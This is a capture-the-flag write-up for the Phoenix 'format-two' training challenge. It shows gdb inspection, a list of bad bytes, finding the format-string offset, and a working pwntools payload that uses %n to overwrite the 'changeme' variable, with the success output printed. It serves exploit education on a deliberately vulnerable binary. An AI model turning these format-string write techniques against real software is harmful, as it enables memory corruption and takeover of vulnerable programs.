# format two


if we run `gdb --args ./format-two $(python -c "print "%p"*256)` 
and break at main: 

`b *main`


and then we take look at the assembly code:
```
   0x0000000000400705 <+120>:	mov    eax,DWORD PTR [rip+0x2003e5]        # 0x600af0 <changeme>
```


in this section the address of changeme is 0x600af0 which contains the `\x0a` bad character.
Here's a list of bad characters:

``` python
    \x00 
    \x09
    \x0a 
    \x0d
    \x20 
```

so we'd have to switch to the i486, in which on the contrary doesn't have any bad characters in the address: 
```
   0x080485a3 <+119>:	mov    eax,ds:0x8049868
```
which is achievable 

we can determine the start of our format string if we input something trivial like `AAAA` and put `%x` until we get something like `0x41414141`

```bash
/format-two 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x'
Welcome to phoenix/format-two, brought to you by https://exploit.education
AAAAffffd8bd.100.0.f7f84b67.ffffd730.ffffd718.80485a0.ffffd610.ffffd8bd.100.3e8.41414141Better luck next time!
```
we notice that we need 11%x to start getting 0x41414141 - so the offset is 11
with that in mind we can now write to the address we like, preferablly the address of changeme.

so write the address in little endian, making sure we read until the address so we can fill it up with our values:


```bash
./format-two $(python -c "from pwn import p32; print p32(0x8049868) + '%p'  * 11  + '%n' +'\n' ")
hï¿½ffffd8c81000f7f84b67ffffd730ffffd71880485a0ffffd610ffffd8c81003e8Well done, the 'changeme' variable has been changed correctly!
```